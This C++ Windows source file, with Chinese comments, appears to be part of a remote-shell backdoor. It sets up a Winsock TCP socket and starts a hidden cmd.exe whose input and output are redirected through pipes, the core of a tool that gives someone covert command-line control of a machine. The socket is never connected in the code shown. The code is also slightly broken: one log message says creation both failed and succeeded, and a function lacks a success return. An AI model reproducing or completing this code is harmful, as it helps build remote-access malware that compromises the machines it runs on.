#include "function.h"
#include "stdafx.h"
//头文件
#include <winsock2.h>
#include <thread>
#include "windows.h"
#include<iostream>
using namespace std;
//包含通信的头文件和库

//库文件
#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
//windows很特殊 ，需要单独调用api进行网络的初始化和反初始化
SOCKET s;
HANDLE hWritePipe; //写端口
HANDLE hCmdReadPipe; //cmd读端口

HANDLE hReadPipe; //读端口
HANDLE hCmdWritePipe; //cmd写端口

void InitSocket() {
	
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	//初始化操作

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {

		cout << "初始化套接字库失败！" << endl;
	}
	else {
		cout << "初始化套接字库成功！" << endl;
	}


	//1.socket  创建一个套接字
	s = socket(
		AF_INET,//INET协议簇
		SOCK_STREAM,//表示使用的使TCP协议
		0);

	if (s == INVALID_SOCKET) {
		cout << "创建套接字库失败！" << endl;
		WSACleanup();
	}
	else {
		cout << "创建套接字库失败成功！" << endl;
	}
}
int InitCmd() {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	SECURITY_ATTRIBUTES Sa = { 0 };
	Sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	Sa.bInheritHandle = TRUE;

	BOOL bRet = CreatePipe(&hCmdReadPipe, &hWritePipe, &Sa, 0);


	if (!bRet) {
		printf("create pipe error ");
		return 0;

	}


	bRet = CreatePipe(&hReadPipe, &hCmdWritePipe, &Sa, 0);


	if (!bRet) {
		printf("create pipe error ");
		return 0;

	}


	//替换cmd标准输入输出
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES; //标志位 开启句柄替换的标志
	si.hStdInput = hCmdReadPipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdError = hCmdWritePipe;

	bRet = CreateProcess(
		_T("C:\\Windows\\System32\\cmd.exe"), //第一个参数 被运行运行程序路径
		NULL, //命令行参数 (不能为常量)（_T("/c calc")）运行计算器
		NULL, //进程句柄继承属性
		NULL, //线程句柄继承属性
		TRUE, //继承开关
		CREATE_NO_WINDOW, //无窗口    OD调试器（DEBUG_PROCESS）
		NULL, //环境变量
		NULL, //当前路径 程序双击启动时的路径 （相对路径）
		&si, //传出参数
		&pi  //传出参数	

	);
	if (!bRet) {
		printf("create process error ");
		return 0;

	}


}